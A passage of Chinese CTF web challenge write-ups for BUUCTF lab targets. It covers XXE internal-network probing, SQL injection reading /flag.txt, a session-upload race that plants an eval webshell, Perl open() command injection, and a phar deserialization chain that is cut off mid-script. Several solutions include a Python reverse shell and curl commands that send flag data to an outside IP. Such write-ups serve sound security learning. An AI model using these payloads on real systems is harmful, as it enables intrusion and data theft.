查看源码有个check.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 \u0026lt;?php #这不是抽奖程序的源代码！不许看！ header(\u0026#34;Content-Type: text/html;charset=utf-8\u0026#34;); session_start(); if(!isset($_SESSION[\u0026#39;seed\u0026#39;])){ $_SESSION[\u0026#39;seed\u0026#39;]=rand(0,999999999); } mt_srand($_SESSION[\u0026#39;seed\u0026#39;]); $str_long1 = \u0026#34;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34;; $str=\u0026#39;\u0026#39;; $len1=20; for ( $i = 0; $i \u0026lt; $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); } $str_show = substr($str, 0, 10); echo \u0026#34;\u0026lt;p id=\u0026#39;p1\u0026#39;\u0026gt;\u0026#34;.$str_show.\u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; if(isset($_POST[\u0026#39;num\u0026#39;])){ if($_POST[\u0026#39;num\u0026#39;]===$str){x echo \u0026#34;\u0026lt;p id=flag\u0026gt;抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}\u0026lt;/p\u0026gt;\u0026#34;; } else{ echo \u0026#34;\u0026lt;p id=flag\u0026gt;没抽中哦，再试试吧\u0026lt;/p\u0026gt;\u0026#34;; } } show_source(\u0026#34;check.php\u0026#34;); 利用mt_rand函数的伪随机数漏洞\n先得到种子,用php_mt_seed工具爆种子\n1 2 3 4 5 6 7 8 9 str1=\u0026#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39; str2=\u0026#39;fnAeH65lyg\u0026#39; res=\u0026#39;\u0026#39; for i in range(len(str2)): for j in range(len(str1)): if str2[i] == str1[j]: res+=str(j)+\u0026#39; \u0026#39;+str(j)+\u0026#39; \u0026#39;+\u0026#39;0\u0026#39;+\u0026#39; \u0026#39;+str(len(str1)-1)+\u0026#39; \u0026#39; break print(res) 1 2 3 4 5 6 7 8 9 \u0026lt;?php mt_srand(206304701); $str_long1 = \u0026#34;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34;; $str=\u0026#39;\u0026#39;; $len1=20; for ( $i = 0; $i \u0026lt; $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); } echo $str; [NCTF2019]True XML cookbook xxe注入，但是跟这个比赛之前的不一样，不能直接读flag了\n这题需要对内网的主机进行探测,我们分别读取关键文件：/etc/hosts 和 /proc/net/arp：\n1 2 3 4 5 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE a [ \u0026lt;!ENTITY abc SYSTEM \u0026#34;file:///etc/hosts\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;user\u0026gt;\u0026lt;username\u0026gt;\u0026amp;abc;\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;123456\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt; 1 2 3 4 5 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE a [ \u0026lt;!ENTITY abc SYSTEM \u0026#34;file:///proc/net/arp\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;user\u0026gt;\u0026lt;username\u0026gt;\u0026amp;abc;\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;123456\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt; 找到ip169.254.1.1\n1 2 3 4 5 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE a [ \u0026lt;!ENTITY abc SYSTEM \u0026#34;http://169.254.1.1\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;user\u0026gt;\u0026lt;username\u0026gt;\u0026amp;abc;\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;123456\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt; intruder爆破c段，就是ip数字最后一个\n不对，读取/proc/net/fib_trie文件\n1 2 3 4 5 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE a [ \u0026lt;!ENTITY abc SYSTEM \u0026#34;file:///proc/net/fib_trie\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;user\u0026gt;\u0026lt;username\u0026gt;\u0026amp;abc;\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;123456\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt; 得到10.244.166.66\n再次爆破，这里的爆破延时要设置\n爆出来长度正常的就是flag\n或者用脚本爆\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import requests as res url=\u0026#34;http://a1fb5d9d-ab10-442b-9323-727c25c3fcb6.node5.buuoj.cn:81/doLogin.php\u0026#34; rawPayload=\u0026#39;\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt;\u0026#39;\\ \u0026#39;\u0026lt;!DOCTYPE user [\u0026#39;\\ \u0026#39;\u0026lt;!ENTITY payload1 SYSTEM \u0026#34;http://10.244.166.{}\u0026#34;\u0026gt;\u0026#39;\\ \u0026#39;]\u0026gt;\u0026#39;\\ \u0026#39;\u0026lt;user\u0026gt;\u0026#39;\\ \u0026#39;\u0026lt;username\u0026gt;\u0026#39;\\ \u0026#39;\u0026amp;payload1;\u0026#39;\\ \u0026#39;\u0026lt;/username\u0026gt;\u0026#39;\\ \u0026#39;\u0026lt;password\u0026gt;\u0026#39;\\ \u0026#39;23\u0026#39;\\ \u0026#39;\u0026lt;/password\u0026gt;\u0026#39;\\ \u0026#39;\u0026lt;/user\u0026gt;\u0026#39; for i in range(1,256): payload=rawPayload.format(i) #payload=rawPayload print(str(\u0026#34;#{} =\u0026gt;\u0026#34;).format(i),end=\u0026#39;\u0026#39;) try: resp=res.post(url,data=payload,timeout=0.5) except: continue else: print(resp.text,end=\u0026#39;\u0026#39;) finally: print(\u0026#39;\u0026#39;) [CISCN2019 华北赛区 Day1 Web5]CyberPunk 在源码最下面有注释\n有个file参数可以读文件\n伪协议读所有前面的php\n1 php://filter/convert.base64-encode/resource=index.php 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;?php ini_set(\u0026#39;open_basedir\u0026#39;, \u0026#39;/var/www/html/\u0026#39;); // $file = $_GET[\u0026#34;file\u0026#34;]; $file = (isset($_GET[\u0026#39;file\u0026#39;]) ? $_GET[\u0026#39;file\u0026#39;] : null); if (isset($file)){ if (preg_match(\u0026#34;/phar|zip|bzip2|zlib|data|input|%00/i\u0026#34;,$file)) { echo(\u0026#39;no way!\u0026#39;); exit; } @include($file); } ?\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 \u0026lt;?php require_once \u0026#34;config.php\u0026#34;; if(!empty($_POST[\u0026#34;user_name\u0026#34;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#34;phone\u0026#34;])) { $msg = \u0026#39;\u0026#39;; $pattern = \u0026#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i\u0026#39;; $user_name = $_POST[\u0026#34;user_name\u0026#34;]; $phone = $_POST[\u0026#34;phone\u0026#34;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = \u0026#39;no sql inject!\u0026#39;; }else{ $sql = \u0026#34;select * from `user` where `user_name`=\u0026#39;{$user_name}\u0026#39; and `phone`=\u0026#39;{$phone}\u0026#39;\u0026#34;; $fetch = $db-\u0026gt;query($sql); } if (isset($fetch) \u0026amp;\u0026amp; $fetch-\u0026gt;num_rows\u0026gt;0){ $row = $fetch-\u0026gt;fetch_assoc(); if(!$row) { echo \u0026#39;error\u0026#39;; print_r($db-\u0026gt;error); exit; } $msg = \u0026#34;\u0026lt;p\u0026gt;姓名:\u0026#34;.$row[\u0026#39;user_name\u0026#39;].\u0026#34;\u0026lt;/p\u0026gt;\u0026lt;p\u0026gt;, 电话:\u0026#34;.$row[\u0026#39;phone\u0026#39;].\u0026#34;\u0026lt;/p\u0026gt;\u0026lt;p\u0026gt;, 地址:\u0026#34;.$row[\u0026#39;address\u0026#39;].\u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; } else { $msg = \u0026#34;未找到订单!\u0026#34;; } }else { $msg = \u0026#34;信息不全\u0026#34;; } ?\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 \u0026lt;?php require_once \u0026#34;config.php\u0026#34;; //var_dump($_POST); if(!empty($_POST[\u0026#34;user_name\u0026#34;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#34;address\u0026#34;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#34;phone\u0026#34;])) { $msg = \u0026#39;\u0026#39;; $pattern = \u0026#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i\u0026#39;; $user_name = $_POST[\u0026#34;user_name\u0026#34;]; $address = $_POST[\u0026#34;address\u0026#34;]; $phone = $_POST[\u0026#34;phone\u0026#34;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = \u0026#39;no sql inject!\u0026#39;; }else{ $sql = \u0026#34;select * from `user` where `user_name`=\u0026#39;{$user_name}\u0026#39; and `phone`=\u0026#39;{$phone}\u0026#39;\u0026#34;; $fetch = $db-\u0026gt;query($sql); } if($fetch-\u0026gt;num_rows\u0026gt;0) { $msg = $user_name.\u0026#34;已提交订单\u0026#34;; }else{ $sql = \u0026#34;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)\u0026#34;; $re = $db-\u0026gt;prepare($sql); $re-\u0026gt;bind_param(\u0026#34;sss\u0026#34;, $user_name, $address, $phone); $re = $re-\u0026gt;execute(); if(!$re) { echo \u0026#39;error\u0026#39;; print_r($db-\u0026gt;error); exit; } $msg = \u0026#34;订单提交成功\u0026#34;; } } else { $msg = \u0026#34;信息不全\u0026#34;; } ?\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;?php require_once \u0026#34;config.php\u0026#34;; if(!empty($_POST[\u0026#34;user_name\u0026#34;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#34;address\u0026#34;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#34;phone\u0026#34;])) { $msg = \u0026#39;\u0026#39;; $pattern = \u0026#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i\u0026#39;; $user_name = $_POST[\u0026#34;user_name\u0026#34;]; $address = addslashes($_POST[\u0026#34;address\u0026#34;]); $phone = $_POST[\u0026#34;phone\u0026#34;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = \u0026#39;no sql inject!\u0026#39;; }else{ $sql = \u0026#34;select * from `user` where `user_name`=\u0026#39;{$user_name}\u0026#39; and `phone`=\u0026#39;{$phone}\u0026#39;\u0026#34;; $fetch = $db-\u0026gt;query($sql); } if (isset($fetch) \u0026amp;\u0026amp; $fetch-\u0026gt;num_rows\u0026gt;0){ $row = $fetch-\u0026gt;fetch_assoc(); $sql = \u0026#34;update `user` set `address`=\u0026#39;\u0026#34;.$address.\u0026#34;\u0026#39;, `old_address`=\u0026#39;\u0026#34;.$row[\u0026#39;address\u0026#39;].\u0026#34;\u0026#39; where `user_id`=\u0026#34;.$row[\u0026#39;user_id\u0026#39;]; $result = $db-\u0026gt;query($sql); if(!$result) { echo \u0026#39;error\u0026#39;; print_r($db-\u0026gt;error); exit; } 一眼二次注入,这里可以在地址的地方注入\n直接用报错注入的方式注入\n1 2 1\u0026#39; or updatexml(1,concat(0x7e,(select substr(load_file(\u0026#39;/flag.txt\u0026#39;),1,30))),1)# 1\u0026#39; or updatexml(1,concat(0x7e,(select substr(load_file(\u0026#39;/flag.txt\u0026#39;),30,60))),1)# 或者构造user_id的形式来注入\n1 1\u0026#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(\u0026#39;/flag.txt\u0026#39;),1,30)),0x7e),1)# 也可以这样让他报错\n1 1\u0026#39;,`user_id`=database()# 1 1\u0026#39;,`user_id`=(select(group_concat(schema_name))from(information_schema.schemata))# 1 \u0026#39;,`user_id`=(select(group_concat(table_name))from(information_schema.tables)where(table_schema=\u0026#39;ctftraining\u0026#39;))# 1 \u0026#39;,`user_id`=(select(group_concat(column_name))from(information_schema.columns)where(table_name=\u0026#39;FLAG_TABLE\u0026#39;))# 1 2 \u0026#39;,`user_id`=(select FLAG_COLUMN from ctftraining.FLAG_TABLE limit 0,1)# 这里查出来空的，所以只能用上面的办法\n[WMCTF2020]Make PHP Great Again 这题用session包含可以解决是非预期\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import io import requests import threading sessid = \u0026#39;bbbbbbb\u0026#39; data = {\u0026#34;cmd\u0026#34;:\u0026#34;system(\u0026#39;cat flag.php\u0026#39;);\u0026#34;} def write(session): while True: f = io.BytesIO(b\u0026#39;a\u0026#39; * 1024 * 50) resp = session.post( \u0026#39;http://b0634b8b-ad08-4453-9292-3efff2a49706.node5.buuoj.cn:81/\u0026#39;, data={\u0026#39;PHP_SESSION_UPLOAD_PROGRESS\u0026#39;: \u0026#39;\u0026lt;?php eval($_POST[\u0026#34;cmd\u0026#34;]);?\u0026gt;\u0026#39;}, files={\u0026#39;file\u0026#39;: (\u0026#39;1.txt\u0026#39;,f)}, cookies={\u0026#39;PHPSESSID\u0026#39;: sessid} ) def read(session): while True: resp = session.post(\u0026#39;http://b0634b8b-ad08-4453-9292-3efff2a49706.node5.buuoj.cn:81/?file=/tmp/sess_\u0026#39;+sessid,data=data) if \u0026#39;1.txt\u0026#39; in resp.text: print(resp.text) event.clear() else: print(\u0026#34;[+++++++++++++]retry\u0026#34;) if __name__==\u0026#34;__main__\u0026#34;: event=threading.Event() with requests.session() as session: for i in range(1,30): threading.Thread(target=write,args=(session,)).start() for i in range(1,30): threading.Thread(target=read,args=(session,)).start() event.set() 预期解是要用到require_once包含的软链接层数较多时once的hash匹配会直接失效造成重复包含\n[php源码分析 require_once 绕过不能重复包含文件的限制][https://www.anquanke.com/post/id/213235]\n1 php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php [网鼎杯 2020 白虎组]PicDown 非预期\n存在任意文件读取\n直接读/flag\n预期\n1 2 3 读取 /proc/self/environ /proc/self/cmdline 有个app.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 from flask import Flask, Response from flask import render_template from flask import request import os import urllib app = Flask(__name__) SECRET_FILE = \u0026#34;/tmp/secret.txt\u0026#34; f = open(SECRET_FILE) SECRET_KEY = f.read().strip() os.remove(SECRET_FILE) @app.route(\u0026#39;/\u0026#39;) def index(): return render_template(\u0026#39;search.html\u0026#39;) @app.route(\u0026#39;/page\u0026#39;) def page(): url = request.args.get(\u0026#34;url\u0026#34;) try: if not url.lower().startswith(\u0026#34;file\u0026#34;): res = urllib.urlopen(url) value = res.read() response = Response(value, mimetype=\u0026#39;application/octet-stream\u0026#39;) response.headers[\u0026#39;Content-Disposition\u0026#39;] = \u0026#39;attachment; filename=beautiful.jpg\u0026#39; return response else: value = \u0026#34;HACK ERROR!\u0026#34; except: value = \u0026#34;SOMETHING WRONG!\u0026#34; return render_template(\u0026#39;search.html\u0026#39;, res=value) @app.route(\u0026#39;/no_one_know_the_manager\u0026#39;) def manager(): key = request.args.get(\u0026#34;key\u0026#34;) print(SECRET_KEY) if key == SECRET_KEY: shell = request.args.get(\u0026#34;shell\u0026#34;) os.system(shell) res = \u0026#34;ok\u0026#34; else: res = \u0026#34;Wrong Key!\u0026#34; return res if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8080) 最后这个路由要求secretkey\n注意关于SECRET_KEY的逻辑，虽然该文件在打开读取后被删除了，但是注意这个文件没有关闭，所以仍然可以通过/proc/self/fd/[num]访问对应文件（此处[num]代表一个未知的数值，需要从0开始遍历找出），这里在/proc/self/fd/3找到\n1 07trZJM8Dfcrv49T5kZfWO7Y048PjXzSh2Q6+Gu7x9c= 下面就是弹shell\n1 2 3 nc -lvp 3333 /no_one_know_the_manager?key=07trZJM8Dfcrv49T5kZfWO7Y048PjXzSh2Q6+Gu7x9c=\u0026amp;shell=python -c \u0026#34;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#39;47.122.53.248\u0026#39;,3333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\u0026#39;/bin/bash\u0026#39;,\u0026#39;-i\u0026#39;]);\u0026#34; 1 /no_one_know_the_manager?key=07trZJM8Dfcrv49T5kZfWO7Y048PjXzSh2Q6+Gu7x9c=\u0026amp;shell=python%20-c%20%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2247.122.53.248%22,3333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27 或者curl把数据外带\n1 2 ?key=07trZJM8Dfcrv49T5kZfWO7Y048PjXzSh2Q6+Gu7x9c=\u0026amp;shell=curl 47.122.53.248:3333/`ls /|base64` ?key=07trZJM8Dfcrv49T5kZfWO7Y048PjXzSh2Q6+Gu7x9c=\u0026amp;shell=curl 47.122.53.248:3333/`cat /flag|base64` [HITCON 2017]SSRFme 代码审计\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;?php if (isset($_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;])) { $http_x_headers = explode(\u0026#39;,\u0026#39;, $_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;]); $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] = $http_x_headers[0]; } echo $_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;]; $sandbox = \u0026#34;sandbox/\u0026#34; . md5(\u0026#34;orange\u0026#34; . $_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;]); @mkdir($sandbox); @chdir($sandbox); $data = shell_exec(\u0026#34;GET \u0026#34; . escapeshellarg($_GET[\u0026#34;url\u0026#34;])); $info = pathinfo($_GET[\u0026#34;filename\u0026#34;]); $dir = str_replace(\u0026#34;.\u0026#34;, \u0026#34;\u0026#34;, basename($info[\u0026#34;dirname\u0026#34;])); @mkdir($dir); @chdir($dir); @file_put_contents(basename($info[\u0026#34;basename\u0026#34;]), $data); highlight_file(__FILE__); orange+ip的MD5值就是目录，然后url传data值给后面filename写入的文件\n题目叫ssrfme，我们先file://读一下文件\n1 ?url=file:///\u0026amp;filename=123 访问flag是空的，下面有个readflag显然要用命令执行readflag才行\n这里有前置知识，利用perl语言的漏洞：因为GET函数在底层调用了perl语言中的open函数，但是该函数存在rce漏洞。当open函数要打开的文件名中存在管道符（并且系统中存在该文件名），就会中断原有打开文件操作，并且把这个文件名当作一个命令来执行。\n先创建文件\n1 ?url=\u0026amp;filename=|/readflag 然后执行命令\n1 ?url=file:|readflag\u0026amp;filename=123 但是这个好像有点问题，用bash命令试试\n1 2 ?url=\u0026amp;filename=|bash -c /readflag ?url=file:|bash -c /readflag\u0026amp;filename=123 或者直接写马蚁剑连接\n1 ?url=data://text,plain,\u0026#39;\u0026lt;?php @eval($_POST[\u0026#39;cmd\u0026#39;]);?\u0026gt;\u0026#39;\u0026amp;filename=shell.php [CISCN2019 华北赛区 Day1 Web1]Dropbox 注册登入后有文件上传功能，不能上传php\n上传其他文件有下载功能存在目录穿越\nindex.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;?php session_start(); if (!isset($_SESSION[\u0026#39;login\u0026#39;])) { header(\u0026#34;Location: login.php\u0026#34;); die(); } ?\u0026gt; \u0026lt;?php include \u0026#34;class.php\u0026#34;; $a = new FileList($_SESSION[\u0026#39;sandbox\u0026#39;]); $a-\u0026gt;Name(); $a-\u0026gt;Size(); ?\u0026gt; class.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 \u0026lt;?php error_reporting(0); $dbaddr = \u0026#34;127.0.0.1\u0026#34;; $dbuser = \u0026#34;root\u0026#34;; $dbpass = \u0026#34;root\u0026#34;; $dbname = \u0026#34;dropbox\u0026#34;; $db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname); class User { public $db; public function __construct() { global $db; $this-\u0026gt;db = $db; } public function user_exist($username) { $stmt = $this-\u0026gt;db-\u0026gt;prepare(\u0026#34;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;\u0026#34;); $stmt-\u0026gt;bind_param(\u0026#34;s\u0026#34;, $username); $stmt-\u0026gt;execute(); $stmt-\u0026gt;store_result(); $count = $stmt-\u0026gt;num_rows; if ($count === 0) { return false; } return true; } public function add_user($username, $password) { if ($this-\u0026gt;user_exist($username)) { return false; } $password = sha1($password . \u0026#34;SiAchGHmFx\u0026#34;); $stmt = $this-\u0026gt;db-\u0026gt;prepare(\u0026#34;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);\u0026#34;); $stmt-\u0026gt;bind_param(\u0026#34;ss\u0026#34;, $username, $password); $stmt-\u0026gt;execute(); return true; } public function verify_user($username, $password) { if (!$this-\u0026gt;user_exist($username)) { return false; } $password = sha1($password . \u0026#34;SiAchGHmFx\u0026#34;); $stmt = $this-\u0026gt;db-\u0026gt;prepare(\u0026#34;SELECT `password` FROM `users` WHERE `username` = ?;\u0026#34;); $stmt-\u0026gt;bind_param(\u0026#34;s\u0026#34;, $username); $stmt-\u0026gt;execute(); $stmt-\u0026gt;bind_result($expect); $stmt-\u0026gt;fetch(); if (isset($expect) \u0026amp;\u0026amp; $expect === $password) { return true; } return false; } public function __destruct() { $this-\u0026gt;db-\u0026gt;close(); } } class FileList { private $files; private $results; private $funcs; public function __construct($path) { $this-\u0026gt;files = array(); $this-\u0026gt;results = array(); $this-\u0026gt;funcs = array(); $filenames = scandir($path); $key = array_search(\u0026#34;.\u0026#34;, $filenames); unset($filenames[$key]); $key = array_search(\u0026#34;..\u0026#34;, $filenames); unset($filenames[$key]); foreach ($filenames as $filename) { $file = new File(); $file-\u0026gt;open($path . $filename); array_push($this-\u0026gt;files, $file); $this-\u0026gt;results[$file-\u0026gt;name()] = array(); } } public function __call($func, $args) { array_push($this-\u0026gt;funcs, $func); foreach ($this-\u0026gt;files as $file) { $this-\u0026gt;results[$file-\u0026gt;name()][$func] = $file-\u0026gt;$func(); } } public function __destruct() { $table = \u0026#39;\u0026lt;div id=\u0026#34;container\u0026#34; class=\u0026#34;container\u0026#34;\u0026gt;\u0026lt;div class=\u0026#34;table-responsive\u0026#34;\u0026gt;\u0026lt;table id=\u0026#34;table\u0026#34; class=\u0026#34;table table-bordered table-hover sm-font\u0026#34;\u0026gt;\u0026#39;; $table .= \u0026#39;\u0026lt;thead\u0026gt;\u0026lt;tr\u0026gt;\u0026#39;; foreach ($this-\u0026gt;funcs as $func) { $table .= \u0026#39;\u0026lt;th scope=\u0026#34;col\u0026#34; class=\u0026#34;text-center\u0026#34;\u0026gt;\u0026#39; . htmlentities($func) . \u0026#39;\u0026lt;/th\u0026gt;\u0026#39;; } $table .= \u0026#39;\u0026lt;th scope=\u0026#34;col\u0026#34; class=\u0026#34;text-center\u0026#34;\u0026gt;Opt\u0026lt;/th\u0026gt;\u0026#39;; $table .= \u0026#39;\u0026lt;/thead\u0026gt;\u0026lt;tbody\u0026gt;\u0026#39;; foreach ($this-\u0026gt;results as $filename =\u0026gt; $result) { $table .= \u0026#39;\u0026lt;tr\u0026gt;\u0026#39;; foreach ($result as $func =\u0026gt; $value) { $table .= \u0026#39;\u0026lt;td class=\u0026#34;text-center\u0026#34;\u0026gt;\u0026#39; . htmlentities($value) . \u0026#39;\u0026lt;/td\u0026gt;\u0026#39;; } $table .= \u0026#39;\u0026lt;td class=\u0026#34;text-center\u0026#34; filename=\u0026#34;\u0026#39; . htmlentities($filename) . \u0026#39;\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;download\u0026#34;\u0026gt;下载\u0026lt;/a\u0026gt; / \u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;delete\u0026#34;\u0026gt;删除\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026#39;; $table .= \u0026#39;\u0026lt;/tr\u0026gt;\u0026#39;; } echo $table; } } class File { public $filename; public function open($filename) { $this-\u0026gt;filename = $filename; if (file_exists($filename) \u0026amp;\u0026amp; !is_dir($filename)) { return true; } else { return false; } } public function name() { return basename($this-\u0026gt;filename); } public function size() { $size = filesize($this-\u0026gt;filename); $units = array(\u0026#39; B\u0026#39;, \u0026#39; KB\u0026#39;, \u0026#39; MB\u0026#39;, \u0026#39; GB\u0026#39;, \u0026#39; TB\u0026#39;); for ($i = 0; $size \u0026gt;= 1024 \u0026amp;\u0026amp; $i \u0026lt; 4; $i++) $size /= 1024; return round($size, 2).$units[$i]; } public function detele() { unlink($this-\u0026gt;filename); } public function close() { return file_get_contents($this-\u0026gt;filename); } } ?\u0026gt; download.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?php session_start(); if (!isset($_SESSION[\u0026#39;login\u0026#39;])) { header(\u0026#34;Location: login.php\u0026#34;); die(); } if (!isset($_POST[\u0026#39;filename\u0026#39;])) { die(); } include \u0026#34;class.php\u0026#34;; ini_set(\u0026#34;open_basedir\u0026#34;, getcwd() . \u0026#34;:/etc:/tmp\u0026#34;); chdir($_SESSION[\u0026#39;sandbox\u0026#39;]); $file = new File(); $filename = (string) $_POST[\u0026#39;filename\u0026#39;]; if (strlen($filename) \u0026lt; 40 \u0026amp;\u0026amp; $file-\u0026gt;open($filename) \u0026amp;\u0026amp; stristr($filename, \u0026#34;flag\u0026#34;) === false) { Header(\u0026#34;Content-type: application/octet-stream\u0026#34;); Header(\u0026#34;Content-Disposition: attachment; filename=\u0026#34; . basename($filename)); echo $file-\u0026gt;close(); } else { echo \u0026#34;File not exist\u0026#34;; } ?\u0026gt; delete.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;?php session_start(); if (!isset($_SESSION[\u0026#39;login\u0026#39;])) { header(\u0026#34;Location: login.php\u0026#34;); die(); } if (!isset($_POST[\u0026#39;filename\u0026#39;])) { die(); } include \u0026#34;class.php\u0026#34;; chdir($_SESSION[\u0026#39;sandbox\u0026#39;]); $file = new File(); $filename = (string) $_POST[\u0026#39;filename\u0026#39;]; if (strlen($filename) \u0026lt; 40 \u0026amp;\u0026amp; $file-\u0026gt;open($filename)) { $file-\u0026gt;detele(); Header(\u0026#34;Content-type: application/json\u0026#34;); $response = array(\u0026#34;success\u0026#34; =\u0026gt; true, \u0026#34;error\u0026#34; =\u0026gt; \u0026#34;\u0026#34;); echo json_encode($response); } else { Header(\u0026#34;Content-type: application/json\u0026#34;); $response = array(\u0026#34;success\u0026#34; =\u0026gt; false, \u0026#34;error\u0026#34; =\u0026gt; \u0026#34;File not exist\u0026#34;); echo json_encode($response); } ?\u0026gt; 构链子\n因为File类下面有file_get_contents可以读取文件，调用了close函数\n查找到User类里面有，但是这样调用会触发__call方法，我们用Filelist类里面的__call发现files变量会执行函数把结果以数组形式返回，我们直接令它为File类，将flag返回然后调用close函数回显\n1 User -\u0026gt;Filelist call -\u0026gt;File close() exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 \u0026lt;?php class User { public $db; } class FileList { private $files; public function __construct() { $this-\u0026gt;files = array(new File()); } } class File { public $filename=\u0026#39;/flag.txt\u0026#39;; public function close() { return file_get_contents($this-\u0026gt;filename); } } $o=new User(); $o-\u0026gt;db=new FileList(); @unlink(\u0026#34;phar.phar\u0026#34;); //生成phar时，文件的后缀名必须为phar $phar = new Phar(\u0026#34;phar.phar\u0026#34;); $phar-\u0026gt;startBuffering(); //设置stub $phar-\u0026gt;setStub(\u0026#39;GIF89a\u0026#39;.\u0026#39;\u0026lt;?php __HALT_COMPILER();?\u0026gt;\u0026#39;); //将自定义的meta-data存入manifest，这个是利用的重点 